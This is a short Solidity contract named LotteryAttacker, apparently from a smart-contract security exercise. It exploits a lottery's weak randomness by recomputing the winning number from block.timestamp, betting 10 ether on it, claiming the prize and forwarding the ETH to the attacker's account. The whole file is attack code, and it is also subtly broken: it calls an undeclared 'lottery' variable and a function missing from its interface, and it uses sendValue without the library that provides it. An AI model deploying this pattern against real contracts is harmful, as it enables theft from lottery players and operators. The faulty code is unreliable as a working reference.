// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ILottery {
  function placeBet(uint8 _number) external payable;
}

contract LotteryAttacker is Ownable {
  ILottery private victim;

  constructor(address _victim) {
    victim = ILottery(_victim);
  }

  function attack() external payable onlyOwner {
    uint8 winningNumber = getWinningNumber();
    victim.placeBet{ value: 10 ether }(winningNumber);
  }

  function getWinningNumber() private view returns (uint8) {
    return uint8(uint256(keccak256(abi.encodePacked(block.timestamp))) % 254) + 1;
  }
  
  // The winner of the lottery will be the address of this contract, thus, this contract needs to call the withdrawPrize() to claim the reward
  function claimReward() external onlyOwner {
    lottery.withdrawPrize();
  }

  // This contract must be able to receive ETH, asap as it receives some ETH, forwards it to the contract's owner (Attacker Account)
  receive() external payable {
    // Immediately send the ETHs to the attacker's account
    payable(owner()).sendValue(address(this).balance);
  }
  
}
